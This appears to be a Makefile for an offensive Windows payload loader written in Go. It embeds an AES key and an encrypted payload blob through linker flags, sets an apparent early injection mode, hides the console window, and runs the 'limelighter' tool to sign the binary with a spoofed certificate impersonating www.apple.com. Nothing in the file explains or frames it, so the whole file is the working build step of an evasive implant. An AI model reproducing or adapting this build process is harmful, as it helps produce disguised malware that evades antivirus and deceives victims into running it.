GOOS=windows
GOARCH=amd64
ENCODE := aes
CALL := early
KEY := yT6kL8kK6jJ3aO2e
SOURCE := cRyLMeJRSVDT3Pt80gFE6wfQsHS7m30uOzfbB5CH36g=
CURRENT_TIME_STAMP := $(shell date +%s)

default:
	@mkdir -p build
	@GOOS=$(GOOS) GOARCH=$(GOARCH) go build -ldflags="-H=windowsgui -X 'main.encode=$(ENCODE)' -X 'main.call=$(CALL)' -X 'main.key=$(KEY)' -X 'main.source=$(SOURCE)'" -o build/${CURRENT_TIME_STAMP}-old.exe ./main.go
	@./limelighter -I build/${CURRENT_TIME_STAMP}-old.exe -O build/${CURRENT_TIME_STAMP}-${GOARCH}.exe -Domain www.apple.com &> /dev/null
	@unlink build/${CURRENT_TIME_STAMP}-old.exe && echo ${CURRENT_TIME_STAMP}-${GOARCH}.exe
